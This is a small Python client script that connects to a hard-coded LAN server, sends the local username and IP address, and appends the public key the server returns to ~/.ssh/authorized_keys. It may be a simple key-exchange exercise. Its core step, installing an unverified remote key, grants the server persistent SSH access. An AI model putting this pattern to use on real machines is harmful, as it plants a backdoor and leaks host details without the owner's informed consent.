import socket
import subprocess
import os

IP = '192.168.1.9'
PORT = 9090
ADDR = (IP, PORT)
SIZE = 1024
FORMAT = "utf-8"
DISCONNECT_MSG = "!DISCONNECT"

def save_key(public_key):
	authorized_keys_path = os.path.expanduser("~/.ssh/authorized_keys")
	with open(authorized_keys_path, "a") as file:
		file.write(public_key + "\n")
		print("Public key added.")

def get_ip():
	cmd = "ifconfig | grep -oE '([0-9]+\.){3}[0-9]+' | head -n 1"
	cmd_output = subprocess.check_output(cmd, shell=True).decode("utf-8").strip()
	return cmd_output

def main():

	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.connect(ADDR)
	print(f"[CONNECTED] Client connected to server at {IP}:{PORT}")

	print("Done")

	username = subprocess.check_output("whoami").decode().strip()
	client_ip = get_ip()
	client_info = f"{username},{client_ip}"
	client.send(client_info.encode(FORMAT))

	print("Done sending")


	data = client.recv(SIZE).decode(FORMAT)

	servername, server_key = data.split(",")
	save_key(server_key)

	print("Done receiving")

	connected = True
	while connected:
		msg = input("> ")
		
		if msg == DISCONNECT_MSG:
			connected = False
		else:
			msg = client.recv(SIZE).decode(FORMAT)
			print(f"[SERVER] {msg}")
	
if __name__ == "__main__":
	main()	
